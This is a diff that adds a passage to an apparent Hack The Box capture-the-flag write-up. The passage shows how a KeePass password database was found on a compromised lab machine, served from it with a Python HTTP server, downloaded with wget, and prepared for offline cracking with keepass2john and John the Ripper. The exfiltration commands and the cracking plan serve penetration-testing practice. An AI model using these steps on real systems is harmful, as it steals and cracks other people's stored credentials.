@@ -240,6 +240,36 @@ There is something interesting:
 
 There is keepass file that includes passwords, maybe there is something that will help us.
 
+After a little movement between directories, the keepass file just been there in front of our eyes.
+
+```
+/home/ross/Documents/Passwords.kdbx
+```
+
+Open new python http server with other port on the target machine.
+then pull the kdbx file to our machine.
+
+```bash
+on target machine:
+python3 -m http.server 1111
+on your machine:
+wget http://10.10.11.191:1111/Passwords.kdbx
+```
+
+Let's open the file with keepassxc-cli:
+
+```bash
+──(root㉿kali)-[/home/kali/Desktop/CTF/HTB]
+└─# keepassxc-cli ls Passwords.kdbx 
+Enter password to unlock Passwords.kdbx: 
+Error while reading the database: Invalid credentials were provided, please try again.
+If this reoccurs, then your database file may be corrupt. (HMAC mismatch)
+```
+
+We need password to open the file. It's time to use keepass2john to convert the file into a hash that john the ripper
+can deal with and work with.
+
+
 
 
 
